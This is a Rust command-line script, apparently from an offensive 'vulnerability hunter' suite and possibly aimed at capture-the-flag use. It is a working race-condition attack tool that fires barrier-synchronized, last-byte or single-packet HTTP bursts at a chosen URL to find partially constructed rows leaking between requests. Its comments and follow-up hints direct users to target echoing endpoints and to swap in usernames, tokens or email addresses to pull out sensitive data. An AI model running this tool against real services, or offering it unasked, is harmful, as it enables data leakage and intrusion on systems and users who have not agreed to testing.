#!/usr/bin/env rust-script
//! name: mut_oracle
//! description: 竞态 partial-construction 变异 oracle - 请求模板(wrap,含 {I} 第 I 发 / {M} marker / {HOST} / {CL} 占位)先逐发串行基线,再按 Barrier 齐发 N 对请求(--mode single-packet 整包单写 / last-byte 末字节同步,预热连接后屏障放行),收齐全部响应判「半构造行」对读面可见性:任一响应含他发 marker 即串线(并发窗口内被改写的中间态经回显/行为差暴露),另报状态/长度相对串行基线的差分簇与 --expect/--expect-not 谓词命中计数,输出 per-response 状态/长度/marker 命中表。攻击面:利用错误页/注册响应回显被并发改写瞬间,或把行内容映射到可读位置(错误信息回显、资料页反射、确认邮件抄送)。
//! version: 1.0.0
//! args: <url> --template 'RAW' [--expect SUB] [--expect-not SUB] [--pairs N] [--mode last-byte|single-packet] [--rounds N] [--read-ms N] [--preview N] [--selftest]
//! keywords: 漏洞猎手套件, race, partial-construction, mutation-oracle, 半构造行, 串线, single-packet, last-byte-sync, barrier, echo
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::io::{ErrorKind, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{mpsc, Arc, Barrier, Mutex};
use std::time::{Duration, Instant};
use url::Url;

const SLICE_MS: u64 = 3000;

trait ReadWrite: Read + Write {}
impl<T: Read + Write> ReadWrite for T {}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut it = s.chars();
    while let Some(c) = it.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match it.next() {
            Some('r') => out.push('\r'),
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('0') => out.push('\0'),
            Some('\\') => out.push('\\'),
            Some(other) => out.push(other),
            None => out.push('\\'),
        }
    }
    out
}

fn connect(host: &str, port: u16, tls: bool) -> Result<Box<dyn ReadWrite>, String> {
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_read_timeout(Some(Duration::from_millis(SLICE_MS)));
    let _ = tcp.set_write_timeout(Some(Duration::from_secs(10)));
    if tls {
        let mut roots = rustls::RootCertStore::empty();
        roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
        let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
        let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls init: {e}"))?;
        Ok(Box::new(rustls::StreamOwned::new(conn, tcp)))
    } else {
        Ok(Box::new(tcp))
    }
}

/// Read until the whole `window_ms` has elapsed (or EOF), collecting everything.
fn read_window<S: Read>(s: &mut S, window_ms: u64) -> (Vec<u8>, bool) {
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 16384];
    let start = Instant::now();
    loop {
        match s.read(&mut buf) {
            Ok(0) => return (out, true),
            Ok(n) => out.extend_from_slice(&buf[..n]),
            Err(e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {
                if start.elapsed() >= Duration::from_millis(window_ms) {
                    return (out, false);
                }
            }
            Err(_) => return (out, true),
        }
        if start.elapsed() >= Duration::from_millis(window_ms) {
            return (out, false);
        }
    }
}

/// Per-fire marker: the trailing X9 anchors the digits so MUT1X9 never matches inside MUT10X9.
fn marker(i: usize) -> String {
    format!("MUT{i}X9")
}

/// Render the wrap two-pass: {I}/{M}/{HOST} first, then {CL} = body byte length after the header split.
fn render(tpl: &str, host: &str, i: usize) -> String {
    let t = unescape(tpl).replace("{I}", &i.to_string()).replace("{M}", &marker(i)).replace("{HOST}", host);
    let cl = t.find("\r\n\r\n").map(|p| t.len() - p - 4).unwrap_or(0);
    t.replace("{CL}", &cl.to_string())
}

fn status_of(bytes: &[u8]) -> u16 {
    let text = String::from_utf8_lossy(bytes);
    text.split("\r\n")
        .find(|l| l.starts_with("HTTP/"))
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse().ok())
        .unwrap_or(0)
}

struct Fired {
    status: u16,
    text: String,
    bytes: usize,
    elapsed_ms: u64,
    error: String,
}

fn fired_err(e: String) -> Fired {
    Fired { status: 0, text: String::new(), bytes: 0, elapsed_ms: 0, error: e }
}

fn fired_ok(raw: Vec<u8>, start: Instant) -> Fired {
    Fired {
        status: status_of(&raw),
        bytes: raw.len(),
        text: String::from_utf8_lossy(&raw).into_owned(),
        elapsed_ms: start.elapsed().as_millis() as u64,
        error: String::new(),
    }
}

/// Serial baseline exchange: one connection, one full write, read the window.
fn exchange_serial(host: &str, port: u16, tls: bool, req: &[u8], read_ms: u64) -> Fired {
    match connect(host, port, tls) {
        Ok(mut s) => {
            if let Err(e) = s.write_all(req).and_then(|_| s.flush()) {
                return fired_err(format!("write: {e}"));
            }
            let t = Instant::now();
            let (raw, _) = read_window(&mut s, read_ms);
            fired_ok(raw, t)
        }
        Err(e) => fired_err(e),
    }
}

/// One synchronized burst: every worker pre-connects (and in last-byte mode pre-writes
/// everything but the final byte), parks on the barrier, then releases together.
fn burst(host: &str, port: u16, tls: bool, tpl: &str, total: usize, last_byte: bool, read_ms: u64) -> Vec<Fired> {
    let barrier = Arc::new(Barrier::new(total));
    let (tx, rx) = mpsc::channel::<(usize, Fired)>();
    let mut handles = Vec::new();
    for i in 0..total {
        let req = render(tpl, host, i).into_bytes();
        let host = host.to_string();
        let barrier = Arc::clone(&barrier);
        let tx = tx.clone();
        handles.push(std::thread::spawn(move || {
            let fired = match connect(&host, port, tls) {
                Ok(mut s) => {
                    let hold = if last_byte && !req.is_empty() { req.len() - 1 } else { 0 };
                    if let Err(e) = s.write_all(&req[..hold]).and_then(|_| s.flush()) {
                        barrier.wait();
                        fired_err(format!("prewrite: {e}"))
                    } else {
                        barrier.wait();
                        let t = Instant::now();
                        match s.write_all(&req[hold..]).and_then(|_| s.flush()) {
                            Ok(()) => {
                                let (raw, _) = read_window(&mut s, read_ms);
                                fired_ok(raw, t)
                            }
                            Err(e) => fired_err(format!("fire: {e}")),
                        }
                    }
                }
                // A connect failure must still reach the barrier or every worker hangs.
                Err(e) => {
                    barrier.wait();
                    fired_err(e)
                }
            };
            let _ = tx.send((i, fired));
        }));
    }
    drop(tx);
    let mut indexed: Vec<(usize, Fired)> = Vec::with_capacity(total);
    for _ in 0..total {
        if let Ok(pair) = rx.recv() {
            indexed.push(pair);
        }
    }
    for h in handles {
        let _ = h.join();
    }
    indexed.sort_by_key(|(i, _)| *i);
    indexed.into_iter().map(|(_, f)| f).collect()
}

/// Per-response table plus the three oracle readings: cross-marker bleed (串线),
/// status/length differential clusters vs the serial baseline, predicate hit counts.
fn analyze(rows: &[Fired], baseline: Option<&[Fired]>, expect: &str, expect_not: &str, preview: usize) -> Value {
    let total = rows.len();
    let markers: Vec<String> = (0..total).map(marker).collect();
    let mut out_rows = Vec::new();
    let mut cross = 0usize;
    let mut expect_hits = 0usize;
    let mut expect_not_viol = 0usize;
    let mut clusters: BTreeMap<String, (usize, Vec<usize>)> = BTreeMap::new();
    for (i, r) in rows.iter().enumerate() {
        let foreign: Vec<usize> = (0..total).filter(|&j| j != i && !r.text.is_empty() && r.text.contains(&markers[j])).collect();
        if !foreign.is_empty() {
            cross += 1;
        }
        let own = r.text.contains(&markers[i]);
        let eh = !expect.is_empty() && r.text.contains(expect);
        let enh = !expect_not.is_empty() && r.text.contains(expect_not);
        if eh {
            expect_hits += 1;
        }
        if enh {
            expect_not_viol += 1;
        }
        let (delta, key) = match baseline {
            Some(b) if i < b.len() => {
                let d = r.bytes as i64 - b[i].bytes as i64;
                (Value::from(d), format!("{}:{d:+}", r.status))
            }
            _ => (Value::Null, format!("{}:self", r.status)),
        };
        let entry = clusters.entry(key).or_insert_with(|| (0, Vec::new()));
        entry.0 += 1;
        entry.1.push(i);
        out_rows.push(json!({
            "i": i,
            "pair": i / 2,
            "marker": markers[i],
            "status": r.status,
            "bytes": r.bytes,
            "delta_len_vs_baseline": delta,
            "elapsed_ms": r.elapsed_ms,
            "own_marker": own,
            "foreign_markers": foreign,
            "expect_hit": eh,
            "expect_not_hit": enh,
            "error": r.error,
            "snippet": r.text.chars().take(preview).collect::<String>(),
        }));
    }
    let mut cluster_vec: Vec<(String, usize, Vec<usize>)> = clusters.into_iter().map(|(k, (n, idx))| (k, n, idx)).collect();
    cluster_vec.sort_by(|a, b| b.1.cmp(&a.1));
    let cluster_rows: Vec<Value> = cluster_vec
        .iter()
        .map(|(k, n, idx)| {
            let (st, dl) = k.split_once(':').unwrap_or((k.as_str(), ""));
            json!({"status": st, "delta_len": dl, "count": n, "indices": idx})
        })
        .collect();
    json!({
        "rows": out_rows,
        "cross_marker_responses": cross,
        "expect_hits": expect_hits,
        "expect_not_violations": expect_not_viol,
        "diff_clusters": cluster_rows,
    })
}

#[allow(clippy::too_many_arguments)]
fn run(host: &str, port: u16, tls: bool, tpl: &str, expect: &str, expect_not: &str, pairs: usize, mode: &str, rounds: usize, read_ms: u64, preview: usize) -> Result<Value, String> {
    let total = pairs.max(1) * 2;
    let last_byte = mode != "single-packet";
    let mut baseline = Vec::with_capacity(total);
    for i in 0..total {
        let req = render(tpl, host, i).into_bytes();
        baseline.push(exchange_serial(host, port, tls, &req, read_ms));
    }
    let baseline_errors = baseline.iter().filter(|r| !r.error.is_empty() || r.status == 0).count();
    let base = analyze(&baseline, None, expect, expect_not, preview);
    let mut round_rows = Vec::new();
    let mut cross_total = 0usize;
    for round in 1..=rounds.max(1) {
        let rows = burst(host, port, tls, tpl, total, last_byte, read_ms);
        let mut v = analyze(&rows, Some(&baseline), expect, expect_not, preview);
        v["round"] = json!(round);
        cross_total += v["cross_marker_responses"].as_u64().unwrap_or(0) as usize;
        round_rows.push(v);
    }
    Ok(json!({
        "url": format!("{}://{}:{}", if tls { "https" } else { "http" }, host, port),
        "mode": mode,
        "pairs": pairs,
        "total_per_round": total,
        "rounds": rounds,
        "baseline_errors": baseline_errors,
        "baseline": base,
        "race_rounds": round_rows,
        "partial_construction_visible": cross_total > 0,
    }))
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut url = String::new();
    let mut tpl = String::new();
    let mut expect = String::new();
    let mut expect_not = String::new();
    let mut pairs = 5usize;
    let mut mode = "last-byte".to_string();
    let mut rounds = 1usize;
    let mut read_ms = 4_000u64;
    let mut preview = 160usize;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--template" => { i += 1; tpl = arg(&args, i); }
            "--expect" => { i += 1; expect = arg(&args, i); }
            "--expect-not" => { i += 1; expect_not = arg(&args, i); }
            "--pairs" => { i += 1; pairs = arg(&args, i).parse().unwrap_or(5).max(1); }
            "--mode" => { i += 1; mode = arg(&args, i); }
            "--rounds" => { i += 1; rounds = arg(&args, i).parse().unwrap_or(1).max(1); }
            "--read-ms" => { i += 1; read_ms = arg(&args, i).parse().unwrap_or(4_000); }
            "--preview" => { i += 1; preview = arg(&args, i).parse().unwrap_or(160); }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if url.is_empty() || tpl.is_empty() {
        pi_rust_lib::report::failure("mut_oracle", "missing url/--template", "usage: mut_oracle <url> --template 'POST /x HTTP/1.1\\r\\nHost: {HOST}\\r\\nContent-Length: {CL}\\r\\n\\r\\na={I}&m={M}' [--expect S] [--mode single-packet]");
        std::process::exit(2);
    }
    if mode != "last-byte" && mode != "single-packet" {
        pi_rust_lib::report::failure("mut_oracle", "--mode must be last-byte or single-packet", "last-byte holds the final byte on the barrier; single-packet writes the whole request after it");
        std::process::exit(2);
    }
    let parsed = Url::parse(&url).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(if parsed.scheme() == "https" { 443 } else { 80 });
    let tls = parsed.scheme() == "https";

    match run(&host, port, tls, &tpl, &expect, &expect_not, pairs, &mode, rounds, read_ms, preview) {
        Ok(v) => {
            let visible = v["partial_construction_visible"].as_bool().unwrap_or(false);
            let next = if visible {
                "串线成立:半构造行对读面可见 - 把 {M} 邻位换成敏感字段句柄(用户名/令牌/邮件地址)重打复现,或接 banner_verdict 确认解题"
            } else {
                "no cross-marker bleed: raise --pairs/--rounds, try the other --mode, or point the wrap at an endpoint that echoes row state (error pages, registration responses, profile reflection)"
            };
            pi_rust_lib::report::success("mut_oracle", v, next).unwrap_or(());
        }
        Err(e) => {
            pi_rust_lib::report::failure("mut_oracle", &e, "check host/port and the template literal (\\r\\n escapes, {CL} on requests with a body)");
            std::process::exit(1);
        }
    }
}

// ---------------------------------------------------------------------------
// selftest: a local mock whose handler parks each request's marker in one
// shared row, sleeps out a settle window, then reads the row back - a textbook
// partial-construction read. Serial traffic always reads its own marker; a
// barrier-released burst reads whichever writer landed last.
// ---------------------------------------------------------------------------

fn find_sub(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w == needle)
}

fn read_request<S: Read>(s: &mut S) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    loop {
        if let Some(p) = find_sub(&buf, b"\r\n\r\n") {
            let head = String::from_utf8_lossy(&buf[..p]).into_owned();
            let cl: usize = head
                .split("\r\n")
                .find_map(|l| {
                    let (k, v) = l.split_once(':')?;
                    if k.trim().eq_ignore_ascii_case("content-length") {
                        v.trim().parse().ok()
                    } else {
                        None
                    }
                })
                .unwrap_or(0);
            if buf.len() >= p + 4 + cl {
                break;
            }
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => buf.extend_from_slice(&chunk[..n]),
            Err(_) => break,
        }
    }
    buf
}

fn extract_marker(text: &str) -> String {
    match text.find("m=MUT") {
        Some(p) => {
            let rest = &text[p + 2..];
            let e = rest.find(|c: char| !c.is_ascii_alphanumeric()).unwrap_or(rest.len());
            rest[..e].to_string()
        }
        None => String::new(),
    }
}

fn selftest_checks(v: &Value, total: usize) -> Vec<String> {
    let mut bad = Vec::new();
    if v["total_per_round"].as_u64() != Some(total as u64) {
        bad.push("total".to_string());
    }
    if v["baseline"]["cross_marker_responses"].as_u64() != Some(0) {
        bad.push("baseline_cross".to_string());
    }
    let baseline_clean = v["baseline"]["rows"].as_array().map(|rows| {
        rows.iter().all(|r| r["own_marker"].as_bool() == Some(true) && r["status"].as_u64() == Some(200))
    });
    if baseline_clean != Some(true) {
        bad.push("baseline_own".to_string());
    }
    let rr = &v["race_rounds"][0];
    if rr["cross_marker_responses"].as_u64().unwrap_or(0) < 1 {
        bad.push("race_cross".to_string());
    }
    if rr["expect_hits"].as_u64() != Some(total as u64) {
        bad.push("expect_hits".to_string());
    }
    if rr["expect_not_violations"].as_u64() != Some(0) {
        bad.push("expect_not".to_string());
    }
    bad
}

fn selftest() {
    let listener = match TcpListener::bind("127.0.0.1:0") {
        Ok(l) => l,
        Err(e) => {
            pi_rust_lib::report::failure("mut_oracle", &format!("selftest bind: {e}"), "localhost listener must be bindable");
            std::process::exit(1);
        }
    };
    let port = listener.local_addr().map(|a| a.port()).unwrap_or(0);
    let slot: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    let slot_loop = Arc::clone(&slot);
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let slot = Arc::clone(&slot_loop);
            std::thread::spawn(move || {
                let _ = s.set_read_timeout(Some(Duration::from_secs(15)));
                let req = read_request(&mut s);
                let text = String::from_utf8_lossy(&req).into_owned();
                let own = extract_marker(&text);
                *slot.lock().unwrap() = own.clone();
                std::thread::sleep(Duration::from_millis(200));
                let shared = slot.lock().unwrap().clone();
                let body = format!("ROW state={shared} req={own}");
                let resp = format!("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", body.len(), body);
                let _ = s.write_all(resp.as_bytes());
                let _ = s.flush();
            });
        }
    });

    let tpl = "POST /mutate HTTP/1.1\\r\\nHost: {HOST}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: {CL}\\r\\nConnection: close\\r\\n\\r\\nusername=u{I}&m={M}";
    let rendered = render(tpl, "127.0.0.1", 0);
    let mut bad: Vec<String> = Vec::new();
    if !(rendered.contains("m=MUT0X9") && rendered.contains("Content-Length: 20") && rendered.contains("\r\n\r\nusername=u0")) {
        bad.push("render".to_string());
    }

    let pairs = 3usize;
    let total = pairs * 2;
    let lb = run("127.0.0.1", port, false, tpl, "ROW state=", "ZZZABSENT", pairs, "last-byte", 1, 5_000, 120);
    let sp = run("127.0.0.1", port, false, tpl, "ROW state=", "ZZZABSENT", pairs, "single-packet", 1, 5_000, 120);
    match &lb {
        Ok(v) => bad.extend(selftest_checks(v, total).into_iter().map(|c| format!("last-byte:{c}"))),
        Err(e) => bad.push(format!("last-byte run: {e}")),
    }
    match &sp {
        Ok(v) => bad.extend(selftest_checks(v, total).into_iter().map(|c| format!("single-packet:{c}"))),
        Err(e) => bad.push(format!("single-packet run: {e}")),
    }

    let ok = bad.is_empty();
    let data = json!({
        "selftest": if ok { "ok" } else { "fail" },
        "failed_checks": bad,
        "mock_port": port,
        "render_check": rendered,
        "last_byte_cross": lb.as_ref().ok().map(|v| v["race_rounds"][0]["cross_marker_responses"].clone()).unwrap_or(Value::Null),
        "single_packet_cross": sp.as_ref().ok().map(|v| v["race_rounds"][0]["cross_marker_responses"].clone()).unwrap_or(Value::Null),
        "last_byte_baseline_statuses": lb.as_ref().ok().map(|v| v["baseline"]["rows"].as_array().map(|r| r.iter().map(|x| x["status"].clone()).collect::<Vec<_>>()).unwrap_or_default()).unwrap_or_default(),
    });
    if ok {
        pi_rust_lib::report::success("mut_oracle", data, "selftest passed; point the wrap at a row-echoing endpoint (error/registration/profile) and fire").unwrap_or(());
    } else {
        pi_rust_lib::report::failure("mut_oracle", &format!("selftest failed: {}", data["failed_checks"]), "inspect render/burst/analyze against the mock trace");
    }
    std::process::exit(if ok { 0 } else { 1 });
}
